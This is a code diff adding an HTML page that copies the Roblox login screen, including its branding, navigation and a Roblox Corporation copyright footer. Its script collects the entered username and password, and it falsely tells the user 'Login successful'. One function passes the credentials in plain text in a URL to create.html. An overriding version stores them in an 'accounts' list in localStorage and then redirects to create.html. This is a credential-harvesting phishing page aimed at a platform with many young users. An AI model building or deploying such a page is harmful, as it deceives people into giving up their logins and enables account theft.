@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Login</title>
+  <link rel="icon" href="roblox.png" type="image/png">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background-color: #1c1c1c;
+      font-family: "Segoe UI", Arial, sans-serif;
+      color: white;
+    }
+    .navbar {
+      background-color: #121212;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 24px;
+    }
+    .navbar-left, .navbar-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    .navbar-left img { height: 28px; }
+    .navbar-left div, .navbar-right button {
+      color: white;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .navbar-right button {
+      background-color: #3b82f6;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 6px;
+      color: white;
+      font-weight: 500;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: calc(100vh - 60px);
+    }
+    .login-box {
+      background-color: #2b2b2b;
+      padding: 32px;
+      width: 320px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+    }
+    .login-box h2 {
+      text-align: center;
+      font-size: 20px;
+      margin-bottom: 24px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      border: 1px solid #555;
+      background-color: #1f1f1f;
+      color: white;
+      font-size: 14px;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #444;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .login-btn:hover { background-color: #5c5c5c; }
+    .message {
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+      font-weight: bold;
+    }
+    .options {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #aaa;
+    }
+    .options button {
+      background-color: #3a3a3a;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 8px 12px;
+      margin-top: 8px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .footer {
+      text-align: center;
+      padding: 15px;
+      font-size: 12px;
+      color: #777;
+    }
+    @media (max-width: 480px) {
+      .login-box { width: 90%; padding: 24px; }
+      .navbar { flex-direction: column; align-items: flex-start; }
+      .navbar-left, .navbar-right { flex-wrap: wrap; gap: 8px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="navbar">
+    <div class="navbar-left">
+      <a class="navbar-brand" href="https://www.roblox.com">
+        <img src="roblox.png" alt="Roblox Logo" height="30">
+      </a>
+      <div>Discover</div>
+      <div>Marketplace</div>
+      <div onclick="goToCreate()">Create</div>
+      <div>Robux</div>
+    </div>
+    <div class="navbar-right">
+      <button>Sign Up</button>
+      <button>Log In</button>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="login-box">
+      <h2>Log In</h2>
+      <input type="text" id="username" placeholder="Username/Email/Phone Number" />
+      <input type="password" id="password" placeholder="Password" />
+      <button class="login-btn" onclick="handleLogin()">Log In</button>
+      <div class="message" id="messageBox"></div>
+
+      <div class="options">
+        <p>Forgot password or username?</p>
+        <button>Send a one-time code to my email</button>
+        <button>Use another device</button>
+        <p>Don't have an account? <u>Sign up</u></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    ©2025 Roblox Corporation | Terms | Privacy | Parents | Help
+  </div>
+
+  <script>
+    function handleLogin() {
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+      const msg = document.getElementById("messageBox");
+
+      if (!user || !pass) {
+        msg.textContent = "Please fill out all fields.";
+        msg.style.color = "red";
+      } else {
+        msg.textContent = "Login successful";
+        msg.style.color = "#00cc66";
+      }
+    }
+
+    function goToCreate() {
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+      if (!user || !pass) {
+        alert("Please enter both username and password before continuing.");
+        return;
+      }
+      const url = `create.html?user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`;
+      window.location.href = url;
+    }
+    
+    function goToCreate() {
+  const user = document.getElementById("username").value.trim();
+  const pass = document.getElementById("password").value.trim();
+
+  if (!user || !pass) {
+    alert("Please enter both username and password.");
+    return;
+  }
+
+  // โหลดข้อมูลเก่าจาก localStorage (ถ้ามี)
+  let accounts = JSON.parse(localStorage.getItem("accounts")) || [];
+
+  // เพิ่มชุดใหม่
+  accounts.push({ username: user, password: pass });
+
+  // บันทึกกลับไปที่ localStorage
+  localStorage.setItem("accounts", JSON.stringify(accounts));
+
+  // ไปยังหน้าแสดงผล
+  window.location.href = "create.html";
+}
+
+  </script>
+
+</body>
+</html>
